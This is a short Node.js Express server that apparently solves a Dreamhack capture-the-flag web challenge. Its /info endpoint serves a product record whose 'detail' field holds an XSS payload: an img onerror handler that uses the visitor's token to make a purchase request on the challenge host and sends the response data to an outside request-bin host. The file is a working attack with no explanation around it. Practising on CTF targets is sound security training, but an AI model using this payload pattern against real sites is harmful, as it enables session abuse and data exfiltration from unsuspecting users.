const express = require('express');
const app = express();
const cors = require('cors');

app.use(cors());

const PORT = 4000;
const url = "http://host3.dreamhack.games:16619";
const rqb = "https://dbfsydv.request.dreamhack.games";

app.use(express.json());

app.get('/info', (req, res) => {
    const token = req.headers['token'];

    const items = {
        "id": 1,
        "name": "Web Hacking 강의",
        "price": 1024,
        "detail": `${`<div>`.repeat(512)}${`</div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => {fetch("${rqb}/"+data.data)})'/>`,
        "poster": ""
    }

    if (items) {
        res.send(items);
    } else {
        res.status(403).send('');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
